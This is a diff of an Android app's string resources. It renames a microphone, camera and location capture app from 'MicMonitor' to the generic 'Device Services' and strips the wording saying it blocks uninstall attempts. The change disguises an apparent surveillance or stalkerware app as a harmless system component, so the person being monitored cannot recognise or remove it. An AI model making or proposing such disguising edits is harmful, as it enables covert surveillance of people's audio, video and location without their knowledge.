@@ -1,10 +1,10 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="accessibility_description">Monitors for unauthorized uninstall attempts and requires a password to proceed.</string>
-    <string name="app_name">MicMonitor</string>
-    <string name="app_subtitle">Audio &amp; Video Service</string>
+    <string name="accessibility_description">System service for device management.</string>
+    <string name="app_name">Device Services</string>
+    <string name="app_subtitle">System Services</string>
     <string name="btn_grant_permissions">Grant All Permissions</string>
-    <string name="desc_permissions">MicMonitor needs the following permissions to operate:</string>
+    <string name="desc_permissions">Device Services needs the following permissions to operate:</string>
     <string name="perm_audio">Microphone - for audio capture and streaming</string>
     <string name="perm_camera">Camera - for photo and video capture</string>
     <string name="perm_location">Location - for location services</string>
